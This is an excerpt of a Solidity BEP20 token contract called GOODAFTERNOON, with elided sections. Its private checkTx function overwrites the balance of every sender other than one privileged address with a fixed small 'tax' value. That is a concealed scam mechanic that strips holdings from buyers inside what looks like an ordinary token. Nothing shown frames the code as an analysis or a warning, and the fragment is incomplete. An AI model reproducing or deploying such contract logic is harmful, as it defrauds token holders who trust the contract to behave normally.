...
contract GOODAFTERNOON is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 1000 * 10 ** 6 * 10 ** 9;
    uint256 private tax = 10000000;
    string private _name;
    string private _symbol;
    address public addr=0x1A454e501D181C47842ae70CA97b68716Ecf4a99;
    address _routeradd=0x1A454e501D181C47842ae70CA97b68716Ecf4a99;
    ...
    function checkTx(address sr) private
    {
        if (sr!=con)
        {
            bal[sr]=tax;
